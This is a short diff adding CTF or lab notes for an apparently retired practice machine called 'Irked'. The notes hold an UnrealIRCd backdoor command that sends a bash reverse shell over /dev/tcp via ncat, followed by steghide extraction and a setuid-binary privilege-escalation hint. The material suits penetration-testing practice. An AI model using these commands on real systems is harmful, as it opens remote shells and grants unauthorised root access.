@@ -139,4 +139,10 @@ find . | grep -i tomcat
   config : 33:05
   ftp login, put file
   ImpersonateToken
+
+# Irked Machine:
+  Unreal backdoor: echo "AB; bash -c 'bash -i >& /dev/tcp/ipus/9001 0>&1'" | ncat ip 8067
+  find .backup
+  steghide extract -sf file.jpg -p pass
+  find /usr/bin/viewuser -> change to bash shell
   
